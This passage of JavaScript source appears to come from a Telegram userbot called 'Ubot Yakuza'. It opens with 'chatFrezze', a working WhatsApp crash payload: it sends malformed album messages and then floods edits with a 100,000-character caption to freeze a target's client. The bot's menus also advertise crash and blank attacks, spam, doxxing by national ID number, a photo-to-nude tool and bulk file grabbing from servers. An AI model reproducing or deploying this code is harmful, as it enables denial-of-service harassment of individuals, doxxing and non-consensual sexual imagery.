                  expiryTimestamp: Date.now() + 1814400000
                },                
      }
    },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }      
    );
  } catch (err) {
    console.log(err);
  }
}

async function chatFrezze(sock, target) {
const fakeKey = {
    "remoteJid": target,
    "fromMe": true,
    "id": await sock.relayMessage(target, {
        "albumMessage": {
            "expectedImageCount": -99999999,
            "expectedVideoCount": 0,
            "caption": "x"
        }
    },{})
}

let xx = {
  "url": "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0&mms3=true",
  "mimetype": "image/jpeg",
  "fileSha256": "hCWVPwWmbHO4VlRlOOkk5zhGRI8a6O2XNNEAxrFnpjY=",
  "fileLength": "164089",
  "height": 9999,
  "width": 9999,
  "mediaKey": "2zZ0K/gxShTu5iRuTV4j87U8gAjvaRdJY/SQ7AS1lPg=",
  "fileEncSha256": "ar7dJHDreOoUA88duATMAk/VZaZaMDKGGS6VMlTyOjA=",
  "directPath": "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0"
}

for (let s = 0; s < 5; s++) {
const xy = generateWAMessageFromContent(target, proto.Message.fromObject({
"botInvokeMessage": {
"message": {
    "messageContextInfo": {
        "deviceListMetadata": {},
        "deviceListMetadataVersion": 2,
        "supportPayload": JSON.stringify({
            "version": 2,
            "is_ai_message": true,
            "should_show_system_message": true,
            "ticket_id": crypto.randomBytes(16)
          }),
        "messageSecret": (0, crypto.randomBytes)(32),
        "messageAssociation": {
            "associationType": "MEDIA_ALBUM",
            "parentMessageKey": fakeKey
        }
    },
"imageMessage": xx
}
}
}),{ participant: { jid: target }})

const xz = await sock.relayMessage(target, xy.message, {messageId:xy.key.id})

xx.caption = "ꦾ".repeat(100000);

  sock.relayMessage(target, {
    protocolMessage: {
      type: "MESSAGE_EDIT",
      key: {
        fromMe: true,
        remoteJid: target,
        id: xz
      },
      editedMessage: {
        imageMessage: xx
      }
    }
  }, { participant: { jid: target }})
await sleep(100)
}
}

// ========== END FUNCTION BUG ========= //

if (!global.lastMenuMsg) global.lastMenuMsg = {};

async function sendCleanMenu(client, message, menuText, file = null) {
  const chatId = message?.chat?.id || message?.chatId;
  const userId = message?.from?.id || message?.senderId;
  const msgId = message?.id || message?.messageId;

  if (!chatId || !userId) {
    console.error("sendCleanMenu: chatId/userId tidak ditemukan");
    return;
  }

  try {
    if (global.lastMenuMsg[userId]) {
      await client.deleteMessages(chatId, [global.lastMenuMsg[userId]], { revoke: true }).catch(()=>{});
    }

    if (msgId) {
      await client.deleteMessages(chatId, [msgId], { revoke: true }).catch(()=>{});
    }

    let sent;
    if (file) {
      sent = await client.sendFile(chatId, {
        file,
        caption: menuText,
        parseMode: "html"
      });
    } else {
      sent = await client.sendMessage(chatId, {
        message: menuText,
        parseMode: "html"
      });
    }

    const sentId =
      sent?.id ||
      sent?.messageId ||
      sent?.message_id ||
      sent?.result?.message_id ||
      (Array.isArray(sent) && sent[0]?.id);

    if (sentId) {
      global.lastMenuMsg[userId] = sentId;
    }

  } catch (err) {
    console.error("Menu auto delete error:", err);
  }
}

async function main() {
    if (!config.STRING_SESSION) {
        console.log("No session found. Starting the login process.");
    }
    
    const client = await connectClient();
    if (!client) return;

    const selfUser = await client.getMe();
    
    client.addEventHandler(async (event) => {
        const message = event.message;
        
        if (!message || !message.message) return;
        
        const chatId = message.chatId;
        const sender = await message.getSender();
        const isSelf = sender.id.equals(selfUser.id);
        
        const textMessage = message.message.trim();
        if (afk.isAfk && !isSelf) {
        const shouldReply =
        message.isPrivate || 
        (message.isGroup && (message.mentioned || (message.replyTo?.senderId?.toString() === isSelf?.toString())));
    
    if (!shouldReply) return;

    const detikTotal = Math.floor((Date.now() - afk.since) / 1000);
    let durasi = "";
    if (detikTotal >= 3600) {
        const jam = Math.floor(detikTotal / 3600);
        const menit = Math.floor((detikTotal % 3600) / 60);
        durasi = `${jam} jam ${menit} menit`;
    } else if (detikTotal >= 60) {
        const menit = Math.floor(detikTotal / 60);
        const sisaDetik = detikTotal % 60;
        durasi = `${menit} menit ${sisaDetik} detik`;
    } else {
        durasi = `${detikTotal} detik`;
    }

    const reason = afk.reason || "No Reason";

    await client.sendMessage(message.chatId, {
        message: `<blockquote>😴 <b>sᴇᴅᴀɴɢ AFK</b>
📝 ʀᴇᴀsᴏɴ: ${afk.reason}
⏱️ ᴅᴜʀᴀsɪ: ${durasi}</blockquote>`,
        parseMode: "html",
        replyTo: message.id
    });
}
        
        if (!textMessage.startsWith(prefix)) return;

        const args = textMessage.slice(prefix.length).trim().split(/\s+/);
        const cmd = args.shift().toLowerCase();
        const text = args.join(" ");

        if (isSelfMode && !isSelf) {
            return;
        }

        switch (cmd) {
         case 'menu': {
  const menuText = `
<blockquote expandable>
┏❐ ⌜ <b>︎ ᴜʙᴏᴛ ʏᴀᴋᴜᴢᴀ メ </b> ⌟ ❐
┃⤷ ᴄʀᴇᴀᴛᴏʀ  : @const_true_co
┃⤷ ᴠᴇʀsɪᴏɴ : 6.0.0
┃⤷ sᴛᴀᴛᴜs   : <b>Online</b>
┃⤷ ᴍᴏᴅᴇ     : <i>${isSelfMode ? "Self" : "Public"}</i>
┃⤷ ᴘʀᴇғɪx   : ${prefix}
┃⤷ ᴍᴏᴅᴜʟᴇs  : ${totalFitur}
┃⤷ ᴄᴏᴍᴍᴀɴᴅ : ${prefix}menu
┗❐

</blockquote>`;

  await sendCleanMenu(client, message, menuText, "https://raw.githubusercontent.com/ObyMoods/killtoken/main/photo_1762949114296.jpg"
  );
}
break;
          
          case 'account':
          const menuText2 = `
<blockquote expandable>
┏❐ ⌜ <b> ᴜʙᴏᴛ ʏᴀᴋᴜᴢᴀ メ </b> ⌟ ❐
┃⤷ ᴄʀᴇᴀᴛᴏʀ  : @const_true_co
┃⤷ ᴠᴇʀsɪᴏɴ : 6.0.0
┃⤷ sᴛᴀᴛᴜs   : <b>Online</b>
┃⤷ ᴍᴏᴅᴇ     : <i>${isSelfMode ? "Self" : "Public"}</i>
┃⤷ ᴘʀᴇғɪx   : ${prefix}
┃⤷ ᴄᴏᴍᴍᴀɴᴅ : ${prefix}account
┗❐
╭─❰ <b>👤 A C C O U N T S</b> ❱
│ ⌯⌲ ${prefix}setname | Change Name
│ ⌯⌲ ${prefix}setdesk | Change Bio/Desc
│ ⌯⌲ ${prefix}info    | Account/User Info
│ ⌯⌲ ${prefix}getpp | Taking profile photo and user data
│ ⌯⌲ ${prefix}ping  | Checking bot speed
│ ⌯⌲ ${prefix}createbot  | Creating a bot in BotFather
│ ⌯⌲ ${prefix}revoke  | reset old bot token to new
│ ⌯⌲ ${prefix}delbot  | Deleting bots in BotFather
│ ⌯⌲ ${prefix}update  | update script and display
╰───────────────\n\n© ʙʏ ʏᴀᴋᴜᴢᴀ 👑
</blockquote>`;
           await sendCleanMenu(client, message, menuText2, "https://raw.githubusercontent.com/ObyMoods/killtoken/main/photo_1762961274323.jpg");
         break;
          
          case 'utility':
          const menuText3 = `
<blockquote expandable>
┏❐ ⌜ <b> ᴜʙᴏᴛ ʏᴀᴋᴜᴢᴀ メ </b> ⌟ ❐
┃⤷ ᴄʀᴇᴀᴛᴏʀ  : @const_true_co
┃⤷ ᴠᴇʀsɪᴏɴ : 6.0.0
┃⤷ sᴛᴀᴛᴜs   : <b>Online</b>
┃⤷ ᴍᴏᴅᴇ     : <i>${isSelfMode ? "Self" : "Public"}</i>
┃⤷ ᴘʀᴇғɪx   : ${prefix}
┃⤷ ᴄᴏᴍᴍᴀɴᴅ : ${prefix}utility
┗❐
╭─❰ <b>📁 U T I L I T I E S</b> ❱
│ ⌯⌲ ${prefix}block   | Block a user
│ ⌯⌲ ${prefix}cfdall | Send messages to all users
│ ⌯⌲ ${prefix}cfdgroup | share messages to all groups
│ ⌯⌲ ${prefix}spam  | Sending multiple messages
╰───────────────\n\n© ʙʏ ʏᴀᴋᴜᴢᴀ 👑
</blockquote>`;
           await sendCleanMenu(client, message, menuText3, "https://raw.githubusercontent.com/ObyMoods/killtoken/main/photo_1762960101077.jpg");
       break;
          
          case 'mode':
          const menuText4 = `
<blockquote expandable>
┏❐ ⌜ <b> ᴜʙᴏᴛ ʏᴀᴋᴜᴢᴀ メ </b> ⌟ ❐
┃⤷ ᴄʀᴇᴀᴛᴏʀ  : @const_true_co
┃⤷ ᴠᴇʀsɪᴏɴ : 6.0.0
┃⤷ sᴛᴀᴛᴜs   : <b>Online</b>
┃⤷ ᴍᴏᴅᴇ     : <i>${isSelfMode ? "Self" : "Public"}</i>
┃⤷ ᴘʀᴇғɪx   : ${prefix}
┃⤷ ᴄᴏᴍᴍᴀɴᴅ : ${prefix}mode
┗❐
╭─❰ <b>⚙️ M O D E & S T A T U S</b> ❱
│ ⌯⌲ ${prefix}self    | Switch to Self Mode
│ ⌯⌲ ${prefix}public  | Switch to Public Mode
│ ⌯⌲ ${prefix}afk     | Set AFK status
│ ⌯⌲ ${prefix}unafk   | Return from AFK
│ ⌯⌲ ${prefix}addbl | Blacklist Group
│ ⌯⌲ ${prefix}unaddbl | Remove group blacklist
│ ⌯⌲ ${prefix}blacklist | display blacklist
╰───────────────\n\n© ʙʏ ʏᴀᴋᴜᴢᴀ 👑
</blockquote>`;
          await sendCleanMenu(client, message, menuText4, "https://raw.githubusercontent.com/ObyMoods/killtoken/main/photo_1762959785467.jpg");
       break;
          
          case 'fun':
          const menuText5 = `
<blockquote expandable>
┏❐ ⌜ <b> ᴜʙᴏᴛ ʏᴀᴋᴜᴢᴀ メ </b> ⌟ ❐
┃⤷ ᴄʀᴇᴀᴛᴏʀ  : @const_true_co
┃⤷ ᴠᴇʀsɪᴏɴ : 6.0.0
┃⤷ sᴛᴀᴛᴜs   : <b>Online</b>
┃⤷ ᴍᴏᴅᴇ     : <i>${isSelfMode ? "Self" : "Public"}</i>
┃⤷ ᴘʀᴇғɪx   : ${prefix}
┃⤷ ᴄᴏᴍᴍᴀɴᴅ : ${prefix}fun
┗❐
╭─❰ <b>🔍 F U N & S E A R C H</b> ❱
│ ⌯⌲ ${prefix}xn  | Search Xnxx Videos
│ ⌯⌲ ${prefix}pinterest [ Kata kunci ] | Search images
│ ⌯⌲ ${prefix}spamngl | Send multiple messages
│ ⌯⌲ ${prefix}yt | Search for videos and download
│ ⌯⌲ ${prefix}yts  | Search video youtube
│ ⌯⌲ ${prefix}github | Downloading repository contents
│ ⌯⌲ ${prefix}tonaked | Change photo to nude
│ ⌯⌲ ${prefix}brat | Make text to photos
│ ⌯⌲ ${prefix}toimg | Change stickers to photos
╰───────────────\n\n© ʙʏ ʏᴀᴋᴜᴢᴀ 👑
</blockquote>`;
           await sendCleanMenu(client, message, menuText5, "https://raw.githubusercontent.com/ObyMoods/killtoken/main/photo_1762960172797.jpg");
       break;
          
          case 'download':
          const menuText6 = `
<blockquote expandable>
┏❐ ⌜ <b>︎ ᴜʙᴏᴛ ʏᴀᴋᴜᴢᴀ メ </b> ⌟ ❐
┃⤷ ᴄʀᴇᴀᴛᴏʀ  : @const_true_co
┃⤷ ᴠᴇʀsɪᴏɴ : 6.0.0
┃⤷ sᴛᴀᴛᴜs   : <b>Online</b>
┃⤷ ᴍᴏᴅᴇ     : <i>${isSelfMode ? "Self" : "Public"}</i>
┃⤷ ᴘʀᴇғɪx   : ${prefix}
┃⤷ ᴍᴏᴅᴜʟᴇs  : ${totalFitur}
┃⤷ ᴄᴏᴍᴍᴀɴᴅ : ${prefix}download
┗❐
╭─❰ <b>📥 D O W N L O A D</b> ❱
│ ⌯⌲ ${prefix}tt   | Download TikTok videos
│ ⌯⌲ ${prefix}ttmp3   | Download TikTok audio
│ ⌯⌲ ${prefix}play  | Search for title then download
╰───────────────\n\n© ʙʏ ʏᴀᴋᴜᴢᴀ 👑
</blockquote>`;
          await sendCleanMenu(client, message, menuText6, "https://raw.githubusercontent.com/ObyMoods/killtoken/main/photo_1762960038130.jpg");
       break;
          
          case 'tools':
          const menuText7 = `
<blockquote expandable>
┏❐ ⌜ <b> ᴜʙᴏᴛ ʏᴀᴋᴜᴢᴀ メ </b> ⌟ ❐
┃⤷ ᴄʀᴇᴀᴛᴏʀ  : @const_true_co
┃⤷ ᴠᴇʀsɪᴏɴ : 6.0.0
┃⤷ sᴛᴀᴛᴜs   : <b>Online</b>
┃⤷ ᴍᴏᴅᴇ     : <i>${isSelfMode ? "Self" : "Public"}</i>
┃⤷ ᴘʀᴇғɪx   : ${prefix}
┃⤷ ᴄᴏᴍᴍᴀɴᴅ : ${prefix}tools
┗❐
╭─❰ <b>🛠 T O O L S</b> ❱
│ ⌯⌲ ${prefix}iqc    | Create images iphone
│ ⌯⌲ ${prefix}getcode [ Kata kunci ] | Fetch web files
│ ⌯⌲ ${prefix}dox ( NIK ) | Doxxing number NIK
│ ⌯⌲ ${prefix}prefix ( SIMBOL )
│ ⌯⌲ ${prefix}tourl   | Upload media & get URL
│ ⌯⌲ ${prefix}tourl2  | Upload media & get URL github
│ ⌯⌲ ${prefix}tohd  | add image quality
│ ⌯⌲ ${prefix}trackip | Track IP address
│ ⌯⌲ ${prefix}cekhost | Website data information
│ ⌯⌲ ${prefix}ssweb [ Kata Kunci ] | website screenshot
│ ⌯⌲ ${prefix}q  | Make stickers
│ ⌯⌲ ${prefix}ig | Looking for account information
│ ⌯⌲ ${prefix}cekapikey | check apikey response
╰───────────────\n\n© ʙʏ ʏᴀᴋᴜᴢᴀ 👑
</blockquote>`;
           await sendCleanMenu(client, message, menuText7, "https://raw.githubusercontent.com/ObyMoods/killtoken/main/photo_1762959798877.jpg");
       break;
          
          case 'panel':
          const menuText8 = `
<blockquote expandable>
┏❐ ⌜ <b>︎ ᴜʙᴏᴛ ʏᴀᴋᴜᴢᴀ メ </b> ⌟ ❐
┃⤷ ᴄʀᴇᴀᴛᴏʀ  : @const_true_co
┃⤷ ᴠᴇʀsɪᴏɴ : 6.0.0
┃⤷ sᴛᴀᴛᴜs   : <b>Online</b>
┃⤷ ᴍᴏᴅᴇ     : <i>${isSelfMode ? "Self" : "Public"}</i>
┃⤷ ᴘʀᴇғɪx   : ${prefix}
┃⤷ ᴍᴏᴅᴜʟᴇs  : ${totalFitur}
┃⤷ ᴄᴏᴍᴍᴀɴᴅ : ${prefix}panel
┗❐
╭─❰ <b>🌐 P T E R O D A C T Y L</b> ❱
│ ⌯⌲ ${prefix}1gb - 10gb nama, ID
│ ⌯⌲ ${prefix}unli nama, ID
│ ⌯⌲ ${prefix}delsrv ID
│ ⌯⌲ ${prefix}listsrv
│ ⌯⌲ ${prefix}adp nama, ID
│ ⌯⌲ ${prefix}deladp ID
│ ⌯⌲ ${prefix}listadp
│ ⌯⌲ ${prefix}clearallsrv | Deleting all servers
│ ⌯⌲ ${prefix}clearsrvoff | Remove all offline servers
│ ⌯⌲ ${prefix}clearalluser | Delete all users
│ ⌯⌲ ${prefix}setuser | Change user name
│ ⌯⌲ ${prefix}resetpw | Reset password server
│ ⌯⌲ ${prefix}installpanel | Installing pterodactyl to vps
│ ⌯⌲ ${prefix}uninstallpanel | Uninstalling pterodactyl from vps
│ ⌯⌲ ${prefix}reinstallpanel | Reinstalling pterodactyl
│ ⌯⌲ ${prefix}ambilfile | Fetch all files on all servers
╰───────────────\n\n© ʙʏ ʏᴀᴋᴜᴢᴀ 👑
</blockquote>`;
           await sendCleanMenu(client, message, menuText8, "https://raw.githubusercontent.com/ObyMoods/killtoken/main/photo_1762961278064.jpg");
       break;
          
          case 'vps':
          const menuText9 = `
<blockquote expandable>
┏❐ ⌜ <b> ᴜʙᴏᴛ ʏᴀᴋᴜᴢᴀ メ </b> ⌟ ❐
┃⤷ ᴄʀᴇᴀᴛᴏʀ  : @const_true_co
┃⤷ ᴠᴇʀsɪᴏɴ : 6.0.0
┃⤷ sᴛᴀᴛᴜs   : <b>Online</b>
┃⤷ ᴍᴏᴅᴇ     : <i>${isSelfMode ? "Self" : "Public"}</i>
┃⤷ ᴘʀᴇғɪx   : ${prefix}
┃⤷ ᴄᴏᴍᴍᴀɴᴅ : ${prefix}vps
┗❐
╭─❰ <b>📡 M E N U  V P S</b> ❱
│ ⌯⌲ ${prefix}pass | Change vps password
│ ⌯⌲ ${prefix}cekvps | Retrieving VPS data
╰───────────────\n\n© ʙʏ ʏᴀᴋᴜᴢᴀ 👑
</blockquote>`;
          await sendCleanMenu(client, message, menuText9, "https://raw.githubusercontent.com/ObyMoods/killtoken/main/photo_1762962083747.jpg");
       break;
          
          case 'obf':
          const menuText10 = `
<blockquote expandable>
┏❐ ⌜ <b> ᴜʙᴏᴛ ʏᴀᴋᴜᴢᴀ メ </b> ⌟ ❐
┃⤷ ᴄʀᴇᴀᴛᴏʀ  : @const_true_co
┃⤷ ᴠᴇʀsɪᴏɴ : 6.0.0
┃⤷ sᴛᴀᴛᴜs   : <b>Online</b>
┃⤷ ᴍᴏᴅᴇ     : <i>${isSelfMode ? "Self" : "Public"}</i>
┃⤷ ᴘʀᴇғɪx   : ${prefix}
┃⤷ ᴄᴏᴍᴍᴀɴᴅ : ${prefix}obf
┗❐
╭─❰ <b>🛡 O B F U S C A T E</b> ❱
│ ⌯⌲ ${prefix}encinvis  | Obfuscating invisible code
│ ⌯⌲ ${prefix}encvar  | Obfuscating Var code
│ ⌯⌲ ${prefix}enchtml  | Obfuscating code HTML
│ ⌯⌲ ${prefix}encinvishtml | Obfuscating invisible HTML
│ ⌯⌲ ${prefix}invishtml | invisible HTML small size
╰───────────────\n\n© ʙʏ ʏᴀᴋᴜᴢᴀ 👑
</blockquote>`;
           await sendCleanMenu(client, message, menuText10, "https://raw.githubusercontent.com/ObyMoods/killtoken/main/photo_1762959779535.jpg");
       break;
          
          case 'group':
          const menuText11 = `
<blockquote expandable>
┏❐ ⌜ <b> ᴜʙᴏᴛ ʏᴀᴋᴜᴢᴀ メ </b> ⌟ ❐
┃⤷ ᴄʀᴇᴀᴛᴏʀ  : @const_true_co
┃⤷ ᴠᴇʀsɪᴏɴ : 6.0.0
┃⤷ sᴛᴀᴛᴜs   : <b>Online</b>
┃⤷ ᴍᴏᴅᴇ     : <i>${isSelfMode ? "Self" : "Public"}</i>
┃⤷ ᴘʀᴇғɪx   : ${prefix}
┃⤷ ᴄᴏᴍᴍᴀɴᴅ : ${prefix}group
┗❐
╭─❰ <b>👥️️ M E N U  G R O U P</b> ❱
│ ⌯⌲ ${prefix}ban
│ ⌯⌲ ${prefix}unban
│ ⌯⌲ ${prefix}kick
│ ⌯⌲ ${prefix}mute
│ ⌯⌲ ${prefix}unmute
│ ⌯⌲ ${prefix}del
│ ⌯⌲ ${prefix}promote | Adding group admin
│ ⌯⌲ ${prefix}demote | Deleting group admin
│ ⌯⌲ ${prefix}tagall | Tag all users
│ ⌯⌲ ${prefix}batal | Stop tagging all users
│ ⌯⌲ ${prefix}zombies | Removing deleted accounts
╰──────────────\n\n© ʙʏ ʏᴀᴋᴜᴢᴀ 👑
</blockquote>`;
           await sendCleanMenu(client, message, menuText11, "https://raw.githubusercontent.com/ObyMoods/killtoken/main/photo_1762961132249.jpg");
       break;
          
          case 'vercel':
          const menuText12 = `
<blockquote expandable>
┏❐ ⌜ <b> ᴜʙᴏᴛ ʏᴀᴋᴜᴢᴀ メ </b> ⌟ ❐
┃⤷ ᴄʀᴇᴀᴛᴏʀ  : @const_true_co
┃⤷ ᴠᴇʀsɪᴏɴ : 6.0.0
┃⤷ sᴛᴀᴛᴜs   : <b>Online</b>
┃⤷ ᴍᴏᴅᴇ     : <i>${isSelfMode ? "Self" : "Public"}</i>
┃⤷ ᴘʀᴇғɪx   : ${prefix}
┃⤷ ᴄᴏᴍᴍᴀɴᴅ : ${prefix}vercel
┗❐
╭─❰ <b>📤 M E N U  D E P L O Y</b> ❱
│ ⌯⌲ ${prefix}deploy  | Creating a Vercel website
│ ⌯⌲ ${prefix}deldeploy  | Delete the Vercel website
│ ⌯⌲ ${prefix}listdeploy  | View Vercel website data
╰───────────────\n\n© ʙʏ ʏᴀᴋᴜᴢᴀ 👑
</blockquote>`;
           await sendCleanMenu(client, message, menuText12, "https://raw.githubusercontent.com/ObyMoods/killtoken/main/photo_1762961162872.jpg");
       break;
          
          case 'tiktok':
          const menuText13 = `
<blockquote expandable>
┏❐ ⌜ <b>︎ ᴜʙᴏᴛ ʏᴀᴋᴜᴢᴀ メ </b> ⌟ ❐
┃⤷ ᴄʀᴇᴀᴛᴏʀ  : @const_true_co
┃⤷ ᴠᴇʀsɪᴏɴ : 6.0.0
┃⤷ sᴛᴀᴛᴜs   : <b>Online</b>
┃⤷ ᴍᴏᴅᴇ     : <i>${isSelfMode ? "Self" : "Public"}</i>
┃⤷ ᴘʀᴇғɪx   : ${prefix}
┃⤷ ᴄᴏᴍᴍᴀɴᴅ : ${prefix}tiktok
┗❐
╭─❰ <b>🎥 M E N U  T I K T O K</b> ❱
│ ⌯⌲ ${prefix}tt   | Download TikTok videos
│ ⌯⌲ ${prefix}ttmp3   | Download TikTok audio
│ ⌯⌲ ${prefix}ttsearch  | Searching for TikTok videos
╰───────────────\n\n© ʙʏ ʏᴀᴋᴜᴢᴀ 👑
</blockquote>`;
           await sendCleanMenu(client, message, menuText13, "https://raw.githubusercontent.com/ObyMoods/killtoken/main/photo_1762959940653.jpg");
       break;
       
       case 'protect':
          const menuText14 = `
<blockquote expandable>
┏❐ ⌜ <b> ᴜʙᴏᴛ ʏᴀᴋᴜᴢᴀ メ </b> ⌟ ❐
┃⤷ ᴄʀᴇᴀᴛᴏʀ  : @const_true_co
┃⤷ ᴠᴇʀsɪᴏɴ : 6.0.0
┃⤷ sᴛᴀᴛᴜs   : <b>Online</b>
┃⤷ ᴍᴏᴅᴇ     : <i>${isSelfMode ? "Self" : "Public"}</i>
┃⤷ ᴘʀᴇғɪx   : ${prefix}
┃⤷ ᴄᴏᴍᴍᴀɴᴅ : ${prefix}protect
┗❐
╭─❰ <b>🔒 M E N U  P R O T E C T</b> ❱
│ ⌯⌲ ${prefix}installprotect1 | Anti Delete Server
│ ⌯⌲ ${prefix}installprotect2 | Anti Delete User
│ ⌯⌲ ${prefix}installprotect3 | Anti Akses Location
│ ⌯⌲ ${prefix}installprotect4 | Anti Akses Nodes
│ ⌯⌲ ${prefix}installprotect5 | Anti Akses Nest
│ ⌯⌲ ${prefix}installprotect6 | Anti Akses Settings
│ ⌯⌲ ${prefix}installprotect7 | Anti Akses File Server
│ ⌯⌲ ${prefix}installprotect8 | Anti Akses Server
│ ⌯⌲ ${prefix}installprotect9 | Anti Modif Server
│ ⌯⌲ ${prefix}installprotect10 | Notif Pesan
│ ⌯⌲ ${prefix}installprotect11 | Anti Akses PLTA
│ ⌯⌲ ${prefix}installprotect12 | Anti Update Node
│ ⌯⌲ ${prefix}installprotectall | Install All Protect
│ ⌯⌲ ${prefix}uninstallprotect1
│ ⌯⌲ ${prefix}uninstallprotect2
│ ⌯⌲ ${prefix}uninstallprotect3
│ ⌯⌲ ${prefix}uninstallprotect4
│ ⌯⌲ ${prefix}uninstallprotect5
│ ⌯⌲ ${prefix}uninstallprotect6
│ ⌯⌲ ${prefix}uninstallprotect7
│ ⌯⌲ ${prefix}uninstallprotect8
│ ⌯⌲ ${prefix}uninstallprotect9
│ ⌯⌲ ${prefix}uninstallprotectall
╰───────────────\n\n© ʙʏ ʏᴀᴋᴜᴢᴀ 👑
</blockquote>`;
           await sendCleanMenu(client, message, menuText14, "https://raw.githubusercontent.com/ObyMoods/killtoken/main/photo_1763274794784.jpg");
       break;
       
       case 'bug':
          const menuText15 = `
<blockquote expandable>
┏❐ ⌜ <b> ᴜʙᴏᴛ ʏᴀᴋᴜᴢᴀ メ </b> ⌟ ❐
┃⤷ ᴄʀᴇᴀᴛᴏʀ  : @const_true_co
┃⤷ ᴠᴇʀsɪᴏɴ : 6.0.0
┃⤷ sᴛᴀᴛᴜs   : <b>Online</b>
┃⤷ ᴍᴏᴅᴇ     : <i>${isSelfMode ? "Self" : "Public"}</i>
┃⤷ ᴘʀᴇғɪx   : ${prefix}
┃⤷ ᴄᴏᴍᴍᴀɴᴅ : ${prefix}bug
┗❐
╭─❰ <b>☠️ M E N U  B U G</b> ❱
│ ⌯⌲ ${prefix}reqpair 62xxxx
│ ⌯⌲ ${prefix}listpair
│ ⌯⌲ ${prefix}delpair 62xxxx
│ ⌯⌲ ${prefix}refresh ➩ ʀᴇғʀᴇsʜ ᴀʟʟ sᴇssɪᴏɴs
│ ⌯⌲ ${prefix}cekbio ➩ ɢᴇᴛ ᴡʜᴀᴛsᴀᴘᴘ ᴀᴄᴄᴏᴜɴᴛ ɪɴғᴏ
│ ⌯⌲ ${prefix}delay ➩ ᴅᴇʟᴀʏ ᴠɪsɪʙʟᴇ
│ ⌯⌲ ${prefix}crash ➩ ᴄʀᴀsʜ ᴜɪ sʏsᴛᴇᴍ
│ ⌯⌲ ${prefix}blank ➩ ʙʟᴀɴᴋ sʏsᴛᴇᴍ
╰───────────────\n\n© ʙʏ ʏᴀᴋᴜᴢᴀ 👑
</blockquote>`;
           await sendCleanMenu(client, message, menuText15, "https://raw.githubusercontent.com/ObyMoods/killtoken/main/IMG_20251119_154344_426.jpg");
       break;
                
case "prefix": {
  (async () => {
    try {
      const chatId = message.chat?.id || message.chatId;
      const text = (message.text || "").split(/\s+/).slice(1).join(" ");

      if (!text) {
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ ᴘʀᴇғɪx sᴀᴀᴛ ɪɴɪ: "${prefix}"</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
        return;
      }

      if (text === '""' || text === '"') {
        prefix = "";
        savePrefixToConfig(prefix);
        await client.sendMessage(chatId, {
          message: `<blockquote>✅ ᴘʀᴇғɪx ᴅɪᴜʙᴀʜ <b>ᴛᴀɴᴘᴀ sɪᴍʙᴏʟ</b></blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
        return;
      }

      prefix = text;
      savePrefixToConfig(text);
      await client.sendMessage(chatId, {
        message: `<blockquote>✅ ᴘʀᴇғɪx ʙᴇʀʜᴀsɪʟ ᴅɪᴜʙᴀʜ ᴋᴇ: "${text}"</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

    } catch (e) {
      console.error("Prefix error:", e);
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴇʀʀᴏʀ: ${e.message}</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}
                
            case 'setname':
                if (!text) {
                    return client.sendMessage(chatId, { message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}setname <name></blockquote>`, parseMode: 'html' });
                }
                try {
                    const nameParts = text.split(" ");
                    const firstName = nameParts.shift();
                    const lastName = nameParts.join(" ") || ""; 
                    
                    await client.invoke(
                        new Api.account.UpdateProfile({
                            firstName: firstName,
                            lastName: lastName
                        })
                    );
                    await client.sendMessage(chatId, { message: `<blockquote>✅️ ɴᴀᴍᴀ ʙᴇʀʜᴀsɪʟ ᴅɪᴜʙᴀʜ ᴋᴇ: <b>${text}</b></blockquote>`, parseMode: 'html' });
                } catch (e) {
                    console.error("Error setname:", e);
                    await client.sendMessage(chatId, { message: `<blockquote>❌️ ɢᴀɢᴀʟ ᴍᴇɴɢᴜʙᴀʜ ɴᴀᴍᴀ. ᴇʀʀᴏʀ: ${e.message.slice(0, 50)}...</blockquote>`, parseMode: 'html' });
                }
                break;
                
            case 'setdesk':
                if (!text) {
                    return client.sendMessage(chatId, { message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}setdesk <description></blockquote>`, parseMode: 'html' });
                }
                try {
                    await client.invoke(
                        new Api.account.UpdateProfile({
                            about: text
                        })
                    );
                    await client.sendMessage(chatId, { message: `<blockquote>✅️ ᴅᴇsᴋʀɪᴘsɪ ʙᴇʀʜᴀsɪʟ ᴅɪᴜʙᴀʜ ᴋᴇ: <b>${text}</b></blockquote>`, parseMode: 'html' });
                } catch (e) {
                    console.error("Error setdesk:", e);
                    await client.sendMessage(chatId, { message: `<blockquote>❌️ ɢᴀɢᴀʟ ᴍᴇɴɢᴜʙᴀʜ ᴅᴇsᴋʀɪᴘsɪ. ᴇʀʀᴏʀ: ${e.message.slice(0, 50)}...`, parseMode: 'html' });
                }
                break;

            case 'block':
                if (!text) {
                    return client.sendMessage(chatId, { message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}block <username> ᴀᴛᴀᴜ ɪᴅ</blockquote>`, parseMode: 'html' });
                }
                
                try {
                    await client.sendMessage(chatId, { message: `<blockquote>⌛️ ᴍᴇɴᴄᴏʙᴀ ᴍᴇᴍʙʟᴏᴋɪʀ ᴘᴇɴɢɢᴜɴᴀ <b>${text}</b></blockquote>`, parseMode: 'html' });
                    const targetUser = await client.getEntity(text);
                    
                    await client.invoke(
                        new Api.contacts.Block({
                            id: targetUser
                        })
                    );
                    await client.sendMessage(chatId, { message: `<blockquote>✅️ ᴜsᴇʀ <b>${text}</b> ʙᴇʀʜᴀsɪʟ ᴅɪ ʙʟᴏᴄᴋɪʀ`, parseMode: 'html' });
                } catch (e) {
                    console.error("Error block:", e);
